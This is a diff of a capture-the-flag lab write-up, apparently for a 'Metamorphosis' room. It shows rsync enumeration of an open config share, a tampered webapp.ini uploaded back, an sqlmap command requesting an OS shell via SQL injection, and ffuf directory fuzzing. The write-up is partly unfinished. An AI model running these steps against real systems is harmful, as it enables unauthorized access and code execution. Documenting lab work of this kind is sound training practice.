@@ -128,12 +128,12 @@ Task Completed
 
 
 ```bash
-:~/Metamorphosis# rsync --list-only rsync://10.201.104.23
+:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx
 Conf           	All Confs
 ```
 
 ```bash
-:~/Metamorphosis# rsync --list-only rsync://10.201.104.23/Conf
+:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx/Conf
 drwxrwxrwx          4,096 2021/04/10 21:03:08 .
 -rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
 -rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
@@ -150,7 +150,28 @@ drwxrwxrwx          4,096 2021/04/10 21:03:08 .
 ```
 
 ```bash
-:~/Metamorphosis# rsync -aPv rsync://10.201.104.23/Conf ./Conf
+:~/Metamorphosis# rsync -av --list-only rsync://10.201.34.170/Conf
+receiving incremental file list
+drwxrwxrwx          4,096 2021/04/10 21:03:08 .
+-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
+-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
+-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
+-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
+-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
+-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
+-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
+-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
+-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
+-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
+-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
+-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
+
+sent 20 bytes  received 379 bytes  798.00 bytes/sec
+total size is 193,430  speedup is 484.79
+```
+
+```bash
+:~/Metamorphosis# rsync -aPv rsync://xx.xxx.xxx.xx/Conf ./Conf
 receiving incremental file list
 created directory ./Conf
 ./
@@ -184,8 +205,9 @@ total size is 193,430  speedup is 0.99
 ```
 
 ```bash
-:~/Metamorphosis/Conf# ls
-access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
+:~/Metamorphosis/myConf# ls
+access.conf   debconf.conf  lvm.conf   php.ini     resolv.conf          smb.conf
+bluezone.ini  ldap.conf     mysql.ini  ports.conf  screen-cleanup.conf  webapp.ini
 ```
 
 ```bash
@@ -215,7 +237,7 @@ Local = No
 ```
 
 ```bash
-:~/Metamorphosis/Conf# rsync -aPv webapp.ini rsync://10.201.104.23/Conf/webapp.ini
+:~/Metamorphosis/myConf# rsync -aPv webapp.ini rsync://xx.xxx.xx.xxx/Conf/webapp.ini
 sending incremental file list
 webapp.ini
              71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)
@@ -224,6 +246,39 @@ sent 186 bytes  received 41 bytes  454.00 bytes/sec
 total size is 71  speedup is 0.31
 ```
 
+<h2>/admin/</h2>
+
+<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />
+
+<br>
+<h2>sqlmap</h2>
+
+```bash
+:~/Metamorphosis/myConf# sqlmap -u http://10.201.34.170/admin/index.php --level 5 --risk 3 --batch --os-shell
+```
+
+<h2>/admin/</h2>
+
+<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />
+
+
+<p>
+
+- launched Burp Suite<br>
+- enabled FoxyProxy<br>
+- Username: <code>tom</code><br>
+- clicked Submit Query<br>
+
+</p>
+
+<h2>tom</h2>
+
+<img width="1115" height="163" alt="image" src="https://github.com/user-attachments/assets/bb8eed2f-d752-425c-9c7c-5453d1d54d19" />
+
+
+```bash
+
+```
 
 
 ffuf -u http:/10.201.104.23/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403 -e .phps
